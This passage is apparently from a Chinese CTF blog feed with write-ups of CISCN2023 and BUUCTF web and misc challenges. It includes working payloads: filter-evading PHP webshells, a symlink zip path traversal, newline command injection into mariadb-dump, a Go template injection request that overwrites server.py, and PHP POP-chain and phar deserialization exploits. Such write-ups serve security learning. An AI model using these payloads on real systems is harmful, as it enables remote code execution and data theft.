/><p>第三步，修改cookie中的PHPSESSIONID为SSRF请求的PHPSESSIONID，读取到flag。</p><p><img src="/../images/image-20221128163549644-1686150400486.png" alt="image-20221128163549644"></p><p>查看flag文件名的结果</p><p><img src="/../images/image-20221128163822875-1686150400486.png" alt="image-20221128163822875"></p><h2 id="easy-upload–复现"><a href="#easy-upload–复现" class="headerlink" title="easy_upload–复现"></a>easy_upload–复现</h2><p>dirsearch扫描没有发现其他页面。</p><p>只有一个文件上传功能点</p><ul><li>先上传一句话木马，发现有过滤</li></ul><p><img src="/../images/image-20221128164147870-1686150400486.png" alt="image-20221128164147870"></p><ul><li>尝试图片+.htaceess</li></ul><p><img src="/../images/image-20221128164425319-1686150400486.png" alt="image-20221128164425319"></p><p>发现只接受.php文件，那么就是要绕过文件内容过滤。</p><p>经测试发现</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ ` * 还有很多函数被过滤</span><br></pre></td></tr></table></figure><p>以下可以</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">1</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128164736609-1686150400486.png" alt="image-20221128164736609"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128164852425-1686150400487.png" alt="image-20221128164852425"></p><p>在phpinfo中可以发现<code>disable_function</code>禁用了几乎所有的函数。</p><img src="E:\typora img\image-20221128164951239.png" alt="image-20221128164951239" style="zoom:67%;" /><p>但是没有禁用<code>file_get_contents</code>这个读取文件的函数。所以只要能找到flag的路径就可以了。</p><p>网上的师傅做法是利用原生类来找到路径，利用php字符串解析来绕过字符过滤。</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>查找路径</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># \147\154\157\142\72\57\57\57\146\52 → glob:///f*</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;\147\154\157\142\72\57\57\57\146\52&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128165717142-1686150400487.png" alt="image-20221128165717142"></p><p>读取flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># \146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163 → file_get_contents</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;\146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163&quot;</span>(<span class="string">&quot;/fl1111111111ag&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128165926537-1686150400487.png" alt="image-20221128165926537"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="flybenben–复现"><a href="#flybenben–复现" class="headerlink" title="flybenben–复现"></a>flybenben–复现</h2><p>CE修改</p><p><img src="/../images/QQ%E6%88%AA%E5%9B%BE20221128160736-1686150400487.jpg" alt="QQ截图20221128160736"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2023 初赛</title>
      <link href="/2023/05/31/CISCN2023%E5%88%9D%E8%B5%9B/"/>
      <url>/2023/05/31/CISCN2023%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="27日-unzip"><a href="#27日-unzip" class="headerlink" title="27日_unzip"></a><strong>27日_unzip</strong></h2><p>打开网站，是一个文件上传的功能点，配合题目的名字，直接上传一个软链接文件，然后回显</p><p><img src="/../images/image-20230528170519886-1686150302067.png" alt="image-20230528170519886"></p><p>发现只能上传zip文件，并且使用了<code>unzip</code>命令来解压缩上传的压缩包，所以不能使用路径穿越</p><blockquote><p>因为<code>unzip</code>默认会忽视文件名中<code>../</code></p></blockquote><p><img src="/../images/image-20230528171026375-1686150302067.png" alt="image-20230528171026375"></p><p>但是可以通过软链接达到路径穿越的功能。</p><p>先创建一个软链接指向网站目录，压缩为1.zip</p><blockquote><p>zip要加上-y参数，才能保存软链接</p></blockquote><p><img src="/../images/Snipaste_2023-05-28_15-44-03-1686150302068.png" alt="Snipaste_2023-05-28_15-44-03"></p><p>然后再创建一个与软链接同名的目录，并在该目录下创建木马文件，将该目录压缩为2.zip</p><p><img src="/../images/Snipaste_2023-05-28_15-43-44-1686150302068.png" alt="Snipaste_2023-05-28_15-43-44"></p><p>然后先上传1.zip，解压得到软链接<code>test</code>，再上传2.zip，解压得到test目录和shell.php，因为test指向&#x2F;var&#x2F;www&#x2F;html,所以shell.php实际上是被解压到网站目录下</p><p><img src="/../images/Snipaste_2023-05-28_15-45-01-1686150302068.png" alt="Snipaste_2023-05-28_15-45-01"></p><p><img src="/../images/Snipaste_2023-05-28_15-45-12-1686150302068.png" alt="Snipaste_2023-05-28_15-45-12"></p><p>最后访问，执行<code>cat /flag</code>即可</p><p><img src="/../images/Snipaste_2023-05-28_15-45-38-1686150302068.png" alt="Snipaste_2023-05-28_15-45-38"></p><h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a><strong>dumpit</strong></h2><p>访问网站看到</p><p><img src="/../images/image-20230528171725614-1686150302068.png" alt="image-20230528171725614"></p><p>可以dump和query</p><p>一开始是对着query怼的，因为对dump不熟</p><p><img src="/../images/image-20230528171909470-1686150302069.png" alt="image-20230528171909470"></p><p>把语句打印出来了，所以很明显可以控制table_2_query进行注入，然后题目提示了flag在&#x2F;flag，所以先尝试可不可以写文件getshell，发现不行，查了一下secure_file_priv为NULL确实是不行的</p><p><img src="/../images/image-20230528172420662-1686150302069.png" alt="image-20230528172420662"></p><p>尝试堆叠注入，看一下能不能日志getshell，发现；反引号都被过滤了</p><p><img src="/../images/image-20230528172554485-1686150302069.png" alt="image-20230528172554485"></p><p>所以query这条路就走不通了。</p><p>然后是dump，在网上查到</p><p><img src="/../images/image-20230528172802761-1686150302069.png" alt="image-20230528172802761"></p><p><img src="/../images/image-20230528172816727-1686150302069.png" alt="image-20230528172816727"></p><p>知道了是使用系统命令来dump，这里就存在命令执行漏洞</p><p><img src="/../images/image-20230528173216386-1686150302069.png" alt="image-20230528173216386"></p><p>参照笔记，这里只用0d%0a可以。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=%0d%0a cat index.php </span><br></pre></td></tr></table></figure><p>在here中可以看到源码</p><p><img src="/../images/image-20230528173600848-1686150302069.png" alt="image-20230528173600848"></p><p>关键点</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>然后题目不是说了flag在&#x2F;flag，读了一下发现没用，看了一下权限</p><p><img src="/../images/image-20230528173721850-1686150302069.png" alt="image-20230528173721850"></p><p>开始想着写个🐎，上去提权试试，看了下目录权限，反弹shell也失败了（麻了😅）</p><p><img src="/../images/image-20230528173754533-1686150302069.png" alt="image-20230528173754533"></p><p>后面想到可能被骗了，在环境变量中找到了flag</p><p><img src="/../images/Snipaste_2023-05-28_15-35-41-1686150302069.png" alt="Snipaste_2023-05-28_15-35-41"></p><h2 id="go-session–复现"><a href="#go-session–复现" class="headerlink" title="go_session–复现"></a>go_session–复现</h2><p>本地伪造session</p><p><img src="/../images/image-20230608095627395.png" alt="image-20230608095627395"></p><p><img src="/../images/image-20230608095722517.png" alt="image-20230608095722517"></p><p>测试一下，发现伪造成功了</p><p><img src="/../images/image-20230608095852646.png" alt="image-20230608095852646"></p><p><img src="/../images/image-20230608095436931.png" alt="image-20230608095436931"></p><p>django</p><p><img src="/../images/image-20230608104903856.png" alt="image-20230608104903856"></p><p>go</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error</span><br></pre></td></tr></table></figure><p>SaveUploadedFile上传表单文件到指定的dst</p><p>第一个参数为表单name，第二个参数为要保存的位置</p><p>读取源码</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/admin?name=&#123;%25include+c.Request.Referer()%25&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>E:/test.txt</span><br><span class="line"></span><br><span class="line">/app/server.py</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230608100900686.png" alt="image-20230608100900686"></p><p>发现它是debug模式的，<strong>热部署（就是每次修改之后会重新编译运行一次）</strong></p><p>所以我们可以进行覆盖</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.ClientIP()),c.Query(c.ClientIP()))&#125;&#125;&amp;<span class="number">118.117</span><span class="number">.49</span><span class="number">.52</span>=/app/server.py HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.220</span><span class="number">.192</span><span class="number">.120</span>:<span class="number">8888</span></span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundary7IWRoUoGnVmsx4c3</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-CN;q=<span class="number">0.9</span></span><br><span class="line">Cookie: session-name=MTY4NTE3NzM2NnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxY2f3GZVJmQsLELqlORmAjQMLNbC9ZF0rs_HfZqjIRlw==</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">488</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7IWRoUoGnVmsx4c3</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;118.117.49.52&quot;</span>; filename=<span class="string">&quot;server.py&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: text/x-python</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    result = subprocess.run([<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> result.stdout.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br><span class="line">------WebKitFormBoundary7IWRoUoGnVmsx4c3--</span><br></pre></td></tr></table></figure><p>覆盖完后，访问<code>/flask?name=</code>，成功读取到了&#x2F;flag</p><p><img src="/../images/image-20230608102742110.png" alt="image-20230608102742110"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a><strong>pyshell</strong></h2><p>一眼python沙盒逃逸</p><p>简单测试一下</p><p><img src="/../images/image-20230528175915350-1686150302070.png" alt="image-20230528175915350"></p><p><img src="/../images/image-20230528180007692-1686150302070.png" alt="image-20230528180007692"></p><p>绕一下<code>__import__</code>和<code>system</code></p><p><img src="/../images/image-20230528175941443-1686150302070.png" alt="image-20230528175941443"></p><p>可以用+拼接绕过，最后用_特性和eval函数执行字符串即可</p><p><img src="/../images/image-20230528180159183-1686150302070.png" alt="image-20230528180159183"></p><p>最后的payload</p><p><img src="/../images/image-20230528165834909-1686150302070.png" alt="image-20230528165834909"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF刷题合集</title>
      <link href="/2023/05/31/BUU/"/>
      <url>/2023/05/31/BUU/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-10月赛"><a href="#2022-10月赛" class="headerlink" title="2022.10月赛"></a>2022.10月赛</h1><h2 id="EasyPOP"><a href="#EasyPOP" class="headerlink" title="EasyPOP"></a>EasyPOP</h2><p>pop链</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sorry::_destruct() ---&gt;  show::_tostring()  ---&gt;  secret_code::call ---&gt;  secret_code::show() ---&gt;  sorry::_get() </span><br><span class="line">---&gt;  fine::__invoke()</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发invoke&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;cmd:<span class="subst">$this</span>-&gt;cmd,content:<span class="subst">$this</span>-&gt;content&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发wakeup&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发tostring&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发get&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发destruct&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发call&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发show&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sor</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$secret</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line"><span class="variable">$sor1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$fine</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$sor</span>-&gt;hint = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;ctf = <span class="variable">$secret</span>;</span><br><span class="line"><span class="variable">$secret</span>-&gt;code = <span class="variable">$sor1</span>;</span><br><span class="line"><span class="variable">$sor1</span>-&gt;key = <span class="variable">$fine</span>;</span><br><span class="line"><span class="variable">$fine</span>-&gt;cmd = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$fine</span>-&gt;content = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$sor</span>);<span class="comment">#更改fine属性绕过wakeup</span></span><br><span class="line"><span class="variable">$a</span> =<span class="title function_ invoke__">serialize</span>(<span class="variable">$sor</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="hade-waibo–复现"><a href="#hade-waibo–复现" class="headerlink" title="hade_waibo–复现"></a>hade_waibo–复现</h2><p>cancanneed 存在任意文件读取漏洞</p><p>获得index.php,file.php,class.php源码</p><p>审计class.php的内容，很容易可以知道这是phar反序列化+RCE。</p><p>需要绕过wakeup和正则。</p><p>wakeup是想用常规的属性个数绕过，但是不行，然后正则想不出来。。</p><hr><p>然后看了大佬们的wp后知道，在这道题的php版本下<code>用常规的属性个数绕过</code>是无效的。</p><p>有两个思路</p><ol><li><p>师傅博客：<a href="https://blog.csdn.net/trytowritecode/article/details/127513176">https://blog.csdn.net/trytowritecode/article/details/127513176</a></p><blockquote><p>总结：</p><p>先上传一个内容为</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh  (这里师傅写的是/bash，但是我测试时是不可以的，/sh是可以的)</span></span><br><span class="line">ls /</span><br></pre></td></tr></table></figure><p>的文件，然后重新登录一个名为<code>. ./*</code>的用户上传phar文件，触发反序列化覆盖Test-&gt;$value的值为<code>. ./*</code>,从而执行<code>system(&#39;. ./*&#39;)</code>,实际上是<code>ls /</code></p></blockquote><p>原理如下</p><p>shell中<code>./*</code>会将目录下的按字典排序的第一个文件当作shell脚本执行.</p><p><img src="/../images/image-20221027144023202-1687419303717.png" alt="image-20221027144023202"></p><p>解题</p><p><strong>绕过Test::wakeup，使得Test-&gt;value的值为我们想要的。</strong></p><p>这里涉及到了一个知识点</p><blockquote><p>在php里&amp;相当于两个变量都指向同一个地址，修改一个会影响到另一个。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = &amp;<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> =<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221026153815014-1687419303718.png" alt="image-20221026153815014"></p><p>所以我们就需要找到一个可控变量，然后让<code>Test-&gt;value =  &amp;变量</code>，这样<code>Test-&gt;value</code>就是可控的了。</p><p>在User::wakeup中</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br></pre></td></tr></table></figure><p>所以我们可以通过登录时的用户名来控制<code>Test-&gt;value</code>的值。</p><p>这里贴上师傅的payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//$b-&gt;username=new Test(); 这个不需要</span></span><br><span class="line"><span class="comment">//同时反序列化User和Test类</span></span><br><span class="line"><span class="variable">$b</span>-&gt;test=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$b</span>-&gt;username;</span><br><span class="line"></span><br><span class="line"><span class="comment">//unlink(&quot;SKI12.phar&quot;);</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;SKI12.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里还要注意</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;test=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$b</span>-&gt;username;</span><br></pre></td></tr></table></figure><p>结果是Test类先完成反序列化，User类后完成反序列化，这样才能够绕过Test::wakeup.</p><p>然后按照上面总结的步骤就可以了。</p><p>贴上我复现成功的图</p><p><img src="/../images/image-20221027150538141-1687419303719.png" alt="image-20221027150538141"></p></li><li><p>官方wp</p><blockquote><p>总结：先写入一个文件名为cat的文件，再利用phar反序列化覆盖<code>Test-&gt;$value</code>的值为<code>* /*</code>，从而执行<code>system(&#39;* /*&#39;)</code>,实际上是<code>cat /*</code></p></blockquote><p>原理如下</p><p>shell中单独一个<code>*</code>会将目录下的文件名按照字典排序拼接成命令，第一个文件名作为命令，其他文件名作为命令参数。</p><p><img src="/../images/image-20221017102117317-1687419303719.png" alt="image-20221017102117317"></p><ul><li>写入文件</li></ul><p>用户名为数组绕过User::destruct中的弱比较，从而绕过User::wakeup，同时触发Test::tostring类，从而写入文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 弱比较</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">User-&gt;username = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br></pre></td></tr></table></figure><ul><li><p>执行命令</p><p>与上一个思路一致。</p></li></ul></li></ol><p>非预期解</p><p>直接读取根目录下的start.sh。。。</p><h2 id="EasyLove–复现"><a href="#EasyLove–复现" class="headerlink" title="EasyLove–复现"></a>EasyLove–复现</h2><p>原生类SoapClient发送SSRF请求+CRLF漏洞+redis漏洞</p><p>访问hint.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/var/www/html/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$hint</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hint</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ 